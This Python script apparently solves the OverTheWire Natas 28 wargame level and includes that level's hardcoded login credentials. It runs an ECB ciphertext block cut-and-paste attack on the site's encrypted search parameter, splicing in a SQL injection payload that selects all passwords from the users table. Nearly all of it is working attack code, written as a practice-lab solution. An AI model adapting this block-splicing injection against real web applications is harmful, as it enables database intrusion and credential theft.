from this import d
import requests
import base64
import urllib.parse
import re

URL = "http://natas28.natas.labs.overthewire.org"
USERNAME = "natas28"
PASSWORD = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
SQLI = "\' UNION ALL SELECT password FROM users; # -- "


def get_query_vallue(url):
    url = urllib.parse.urlparse(url).query
    query = urllib.parse.parse_qs(url)['query'][0]
    query = base64.b64decode(query).hex()
    return query


def craft_query(query):
    query = bytearray.fromhex(query)
    query = base64.b64encode(query).decode('utf-8')
    query = urllib.parse.quote(query)
    return query


def init_session():
    s = requests.Session()
    s.auth = (USERNAME, PASSWORD)
    return s



def main():
    s = init_session()
    
    r = s.post(URL, data={
               'query': 'A' * 25 + SQLI, 'submit': 'submit'})
    malicious = (get_query_vallue(r.url))
    r = s.post(URL, data={'query': 'A' * 26, 'submit': 'submit'})
    clean = (get_query_vallue(r.url))

    # starting from 3, add 1 per 16 block, it's 4 cause we have used 26
    crafted = clean[: (4 * 32)]
    # starting from 3, add 1 per 16 block, it's 4 cause we have used 25
    crafted += malicious[(4 * 32):]

    payload = craft_query(crafted)
    r = s.get(URL+"/search.php?query="+payload)
    print(r.text)
